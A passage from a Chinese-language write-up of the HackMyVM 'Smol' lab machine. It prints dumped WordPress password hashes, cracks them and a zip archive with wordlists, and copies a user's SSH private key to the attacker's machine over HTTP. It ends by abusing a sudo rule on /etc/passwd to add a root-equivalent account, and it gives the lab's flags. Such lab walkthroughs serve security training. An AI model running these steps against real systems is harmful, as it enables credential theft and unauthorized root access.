wp_users;\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n|  <span class=\"hljs-number\">1</span> | admin      | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin         | admin@smol.thm     | http://www.smol.hmv | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">16</span> 06:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">30</span> |                     |           <span class=\"hljs-number\">0</span> | admin                  |\n|  <span class=\"hljs-number\">2</span> | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">11</span>:04:07 |                     |           <span class=\"hljs-number\">0</span> | wordpress user         |\n|  <span class=\"hljs-number\">3</span> | think      | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think         | josemlwdf@smol.thm | http://smol.thm     | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">15</span>:01:02 |                     |           <span class=\"hljs-number\">0</span> | Jose Mario Llado Marti |\n|  <span class=\"hljs-number\">4</span> | gege       | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege          | gege@smol.thm      | http://smol.thm     | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">50</span> |                     |           <span class=\"hljs-number\">0</span> | gege                   |\n|  <span class=\"hljs-number\">5</span> | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@smol.thm     | http://smol.thm     | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">15</span> |                     |           <span class=\"hljs-number\">0</span> | diego                  |\n|  <span class=\"hljs-number\">6</span> | xavi       | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi          | xavi@smol.thm      | http://smol.thm     | <span class=\"hljs-number\">2023</span>-08-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">20</span>:01 |                     |           <span class=\"hljs-number\">0</span> | xavi                   |\n+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+\n<span class=\"hljs-number\">6</span> rows <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">set</span> (<span class=\"hljs-number\">0.00</span> sec)\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<h3>数据库</h3>\n<p>因为我们之前得到了数据库的用户名和密码，所以我们拉取一下数据库的数据</p>\n<pre><code class=\"hljs language-python\">www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p\nmysql -u wpuser -p\nEnter password: kbLSF2Vop<span class=\"hljs-comment\">#lw3rjDZ629*Z%G</span>\n\nWelcome to the MySQL monitor.  Commands end <span class=\"hljs-keyword\">with</span> ; <span class=\"hljs-keyword\">or</span> \\g.\nYour MySQL connection <span class=\"hljs-built_in\">id</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">61371</span>\nServer version: <span class=\"hljs-number\">8.0</span><span class=\"hljs-number\">.36</span>-0ubuntu0<span class=\"hljs-number\">.20</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span> (Ubuntu)\n\nCopyright (c) <span class=\"hljs-number\">2000</span>, <span class=\"hljs-number\">2024</span>, Oracle <span class=\"hljs-keyword\">and</span>/<span class=\"hljs-keyword\">or</span> its affiliates.\n\nOracle <span class=\"hljs-keyword\">is</span> a registered trademark of Oracle Corporation <span class=\"hljs-keyword\">and</span>/<span class=\"hljs-keyword\">or</span> its\naffiliates. Other names may be trademarks of their respective\nowners.\n\n<span class=\"hljs-type\">Type</span> <span class=\"hljs-string\">'help;'</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. <span class=\"hljs-type\">Type</span> <span class=\"hljs-string\">'\\c'</span> to clear the current <span class=\"hljs-built_in\">input</span> statement.\n\nmysql> \n</code></pre>\n<p>然后拿到开膛手杰克进行破解，最后能爆破出一个密码 <code>sandiegocalifornia</code></p>\n<pre><code class=\"hljs language-python\">john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">6</span> password hashes <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">6</span> different salts (phpass [phpass ($P$ <span class=\"hljs-keyword\">or</span> $H$) <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 8x3])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">8192</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nsandiegocalifornia (?)  \n</code></pre>\n<p>本来想通过ssh来登录，但是提示须要<code>SSH</code>私钥</p>\n<p>最后通过<code>su</code>的方法来切换用户，最后可以切换到<code>diego</code>用户</p>\n<pre><code class=\"hljs language-python\">www-data@smol:/var/www/wordpress/wp-admin$ su diego\nsu diego\nPassword: sandiegocalifornia\n\ndiego@smol:/var/www/wordpress/wp-admin$ \n</code></pre>\n<h3>UserFlag</h3>\n<p><code>userflag</code>就在<code>diego</code>用户的家目录下</p>\n<pre><code class=\"hljs language-python\">diego@smol:~$ cat user.txt\n45edaec653ff9ee06236b7ce72b86963\n</code></pre>\n<h3>提权  - think用户</h3>\n<p>然后在<code>think</code>用户的家目录可以找到<code>ssh</code>的私钥文件，将其保存到<code>kali</code> 上，然后使用私钥文件登录</p>\n<ol>\n<li>\n<p>开启<code>python</code>的<code>http</code>服务器</p>\n<pre><code class=\"hljs language-python\">diego@smol:/home/think/.ssh$ python3 -m http.server <span class=\"hljs-number\">8001</span>\nServing HTTP on <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> port <span class=\"hljs-number\">8001</span> (http://<span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">8001</span>/) ...\n</code></pre>\n</li>\n<li>\n<p>将其拉取到<code>kali</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─<span class=\"hljs-comment\"># wget 192.168.56.16:8001/id_rsa           </span>\n--<span class=\"hljs-number\">2025</span>-02-05 05:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">21</span>--  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>:<span class=\"hljs-number\">8001</span>/id_rsa\n正在连接 <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>:<span class=\"hljs-number\">8001.</span>.. 已连接。\n已发出 HTTP 请求，正在等待回应... <span class=\"hljs-number\">200</span> OK\n长度：<span class=\"hljs-number\">2602</span> (<span class=\"hljs-number\">2.5</span>K) [application/octet-stream]\n正在保存至: “id_rsa”\n\nid_rsa             <span class=\"hljs-number\">100</span>%[==============>]   <span class=\"hljs-number\">2.54</span>K  --.-KB/s  用时 0s      \n\n<span class=\"hljs-number\">2025</span>-02-05 05:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">21</span> (<span class=\"hljs-number\">402</span> MB/s) - 已保存 “id_rsa” [<span class=\"hljs-number\">2602</span>/<span class=\"hljs-number\">2602</span>])\n</code></pre>\n</li>\n<li>\n<p>使用私钥文件登录，成功登录</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─<span class=\"hljs-comment\"># ssh think@192.168.56.16 -i id_rsa</span>\nWelcome to Ubuntu <span class=\"hljs-number\">20.04</span><span class=\"hljs-number\">.6</span> LTS (GNU/Linux <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">156</span>-generic x86_64)\n\n * Documentation:  https://<span class=\"hljs-built_in\">help</span>.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information <span class=\"hljs-keyword\">as</span> of Wed 05 Feb <span class=\"hljs-number\">2025</span> 06:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">43</span> PM UTC\n\n  System load:  <span class=\"hljs-number\">0.06</span>              Processes:                <span class=\"hljs-number\">218</span>\n  Usage of /:   <span class=\"hljs-number\">55.8</span>% of <span class=\"hljs-number\">9.75</span>GB   Users logged <span class=\"hljs-keyword\">in</span>:          <span class=\"hljs-number\">0</span>\n  Memory usage: <span class=\"hljs-number\">35</span>%               IPv4 address <span class=\"hljs-keyword\">for</span> enp0s17: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.16</span>\n  Swap usage:   <span class=\"hljs-number\">0</span>%\n\nExpanded Security Maintenance <span class=\"hljs-keyword\">for</span> Applications <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> enabled.\n\n<span class=\"hljs-number\">162</span> updates can be applied immediately.\n<span class=\"hljs-number\">125</span> of these updates are standard security updates.\nTo see these additional updates run: apt <span class=\"hljs-built_in\">list</span> --upgradable\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm <span class=\"hljs-keyword\">or</span> run: sudo pro status\n\nThe <span class=\"hljs-built_in\">list</span> of available updates <span class=\"hljs-keyword\">is</span> more than a week old.\nTo check <span class=\"hljs-keyword\">for</span> new updates run: sudo apt update\n\nthink@smol:~$ \n</code></pre>\n</li>\n<li>\n<p>在<code>gege</code>用户加目录下发现<code>wordpress.old.zip</code>文件，但是没有权限读取</p>\n<pre><code class=\"hljs language-python\">think@smol:/home/gege$ ls -al                                                                                                                                \ntotal <span class=\"hljs-number\">31532</span>                                                                                                                                                  \ndrwxr-x--- <span class=\"hljs-number\">2</span> gege internal     <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">2023</span> .                                                                                                           \ndrwxr-xr-x <span class=\"hljs-number\">6</span> root root         <span class=\"hljs-number\">4096</span> Aug <span class=\"hljs-number\">16</span>  <span class=\"hljs-number\">2023</span> ..                           \nlrwxrwxrwx <span class=\"hljs-number\">1</span> root root            <span class=\"hljs-number\">9</span> Aug <span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">2023</span> .bash_history -> /dev/null   \n-rw-r--r-- <span class=\"hljs-number\">1</span> gege gege          <span class=\"hljs-number\">220</span> Feb <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2020</span> .bash_logout                 \n-rw-r--r-- <span class=\"hljs-number\">1</span> gege gege         <span class=\"hljs-number\">3771</span> Feb <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2020</span> .bashrc                      \n-rw-r--r-- <span class=\"hljs-number\">1</span> gege gege          <span class=\"hljs-number\">807</span> Feb <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2020</span> .profile                     \nlrwxrwxrwx <span class=\"hljs-number\">1</span> root root            <span class=\"hljs-number\">9</span> Aug <span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">2023</span> .viminfo -> /dev/null                                                                                       \n-rwxr-x--- <span class=\"hljs-number\">1</span> root gege     <span class=\"hljs-number\">32266546</span> Aug <span class=\"hljs-number\">16</span>  <span class=\"hljs-number\">2023</span> wordpress.old.<span class=\"hljs-built_in\">zip</span>\n\nthink@smol:/home/gege$ cat wordpress.old.<span class=\"hljs-built_in\">zip</span>                                                                                                                 \ncat: wordpress.old.<span class=\"hljs-built_in\">zip</span>: Permission denied \n</code></pre>\n</li>\n<li>\n<p>查看一下<code>id</code>组，发现属于<code>dev</code>组</p>\n<pre><code class=\"hljs language-python\">think@smol:/home/gege$ <span class=\"hljs-built_in\">id</span>                                                                                                                                    \nuid=<span class=\"hljs-number\">1000</span>(think) gid=<span class=\"hljs-number\">1000</span>(think) groups=<span class=\"hljs-number\">1000</span>(think),<span class=\"hljs-number\">1004</span>(dev),<span class=\"hljs-number\">1005</span>(internal) \n</code></pre>\n<p>查看组内成员</p>\n<pre><code class=\"hljs language-python\">think@smol:/home/gege$ cat /etc/group | grep dev\nplugdev:x:<span class=\"hljs-number\">46</span>:\ndev:x:<span class=\"hljs-number\">1004</span>:think,gege\n</code></pre>\n<p>切换<code>gege</code>用户，发现不用密码，然后再切换回去就要密码了，一开始我以为是因为gege用户没有密码，但是我尝试了<code>sudo -l</code>后，输入空密码但是错误，所以可能是再<code>/etc/sudoers</code>文件里面设置了<code>think</code>用户切换<code>gege</code>用户无需密码</p>\n<pre><code class=\"hljs language-python\">think@smol:/home/gege$ su gege\ngege@smol:~$\n</code></pre>\n</li>\n<li>\n<p>尝试解压<code>wordpress.old.zip</code> 发现需要密码，将其拉取下来准备破解</p>\n<pre><code class=\"hljs language-python\">gege@smol:~$ unzip wordpress.old.<span class=\"hljs-built_in\">zip</span> \nArchive:  wordpress.old.<span class=\"hljs-built_in\">zip</span>\n[wordpress.old.<span class=\"hljs-built_in\">zip</span>] wordpress.old/wp-config.php password:\n</code></pre>\n</li>\n</ol>\n<h3>wordpress.old.zip</h3>\n<p>使用<code>fcrackzip</code>来破解，爆破出密码<code>hero_gege@hotmail.com</code></p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/SMOL]\n└─<span class=\"hljs-comment\"># fcrackzip -D -p /usr/share/wordlists/rockyou.txt wordpress.old.zip   </span>\npossible pw found: hero_gege@hotmail.com ()\n</code></pre>\n<p>查看里面的文件，寻找有用的信息</p>\n<p>在<code>wp-config.php</code>中可以找到<code>xavi</code>用户的密码</p>\n<pre><code class=\"hljs language-python\">/** Database username */                                                      \ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'xavi'</span> );                                                  \n                                       \n/** Database password */\ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'P@ssw0rdxavi@'</span> );\n</code></pre>\n<p>我们直接从<code>gege</code>用户直接<code>su</code>到<code>xavi</code>用户</p>\n<pre><code class=\"hljs language-python\">gege@smol:~$ su xavi\nPassword: \nxavi@smol:/home/gege$\n</code></pre>\n<h3>提权</h3>\n<p>因为有了密码，我们可以查看<code>sudo</code>的信息了，发现可以使用<code>root</code>的权限修改<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-python\">xavi@smol:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> xavi: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> xavi on smol:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser xavi may run the following commands on smol:\n    (ALL : ALL) /usr/<span class=\"hljs-built_in\">bin</span>/vi /etc/passwd\n\n</code></pre>\n<p>那么这就可以获取到<code>root</code>权限了，我们直接新建一个用户，把它的权限设置为和<code>root</code>相当即可</p>\n<p>添加新用户<code>sunset</code>密码是<code>hack</code> ，修改完毕后保存并退出</p>\n<pre><code class=\"hljs language-python\">sunset:zSZ7Whrr8hgwY:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/usr/<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<p>切换用户，成功获取到<code>root</code>权限</p>\n<pre><code class=\"hljs language-python\">xavi@smol:~$ su sunset\nPassword: \nroot@smol:/home/xavi$ \n</code></pre>\n<h3>RootFlag</h3>\n<pre><code class=\"hljs language-python\">root@smol:/home/xavi$ cat /root/root.txt \nbf89ea3ea01992353aef1f576214d4e4\n</code></pre>","title":"HackMyVM - Smol","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Smol. https://hackmyvm.eu/machines/machine.php?vm=Smol Notes: I hope you will enjoy it. 信息收集 渗透 优先级 80 22 web 渗透 访问一下web页面（需要修改一下hosts文件，把域名指向靶机IP） 通过..."},"recentPosts":[{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}